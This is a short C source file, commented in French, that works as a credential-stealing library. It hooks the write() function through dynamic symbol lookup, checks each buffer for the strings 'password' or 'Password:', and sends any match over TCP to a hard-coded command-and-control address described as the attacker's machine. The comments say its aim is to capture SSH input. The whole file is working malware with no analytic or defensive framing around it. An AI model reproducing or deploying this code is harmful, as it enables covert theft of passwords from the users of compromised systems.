#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#define C2_IP "192.168.3.131"  // Adresse de la machine attaquante (C2)
#define C2_PORT 4444           // Port d'écoute du C2

// Fonction pour envoyer les données au C2
void send_to_c2(const char *data) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in server_addr;

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(C2_PORT);
    inet_pton(AF_INET, C2_IP, &server_addr.sin_addr);

    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) == 0) {
        send(sock, data, strlen(data), 0);
    }
    close(sock);
}

// Hook de la fonction `write()` pour intercepter les entrées SSH
ssize_t write(int fd, const void *buf, size_t count) {
    static ssize_t (*real_write)(int, const void*, size_t) = NULL;
    if (!real_write)
        real_write = dlsym(RTLD_NEXT, "write");

    // Vérifie si la chaîne contient "password"
    if (strstr(buf, "password") || strstr(buf, "Password:")) {
        send_to_c2(buf);
    }

    return real_write(fd, buf, count);
}
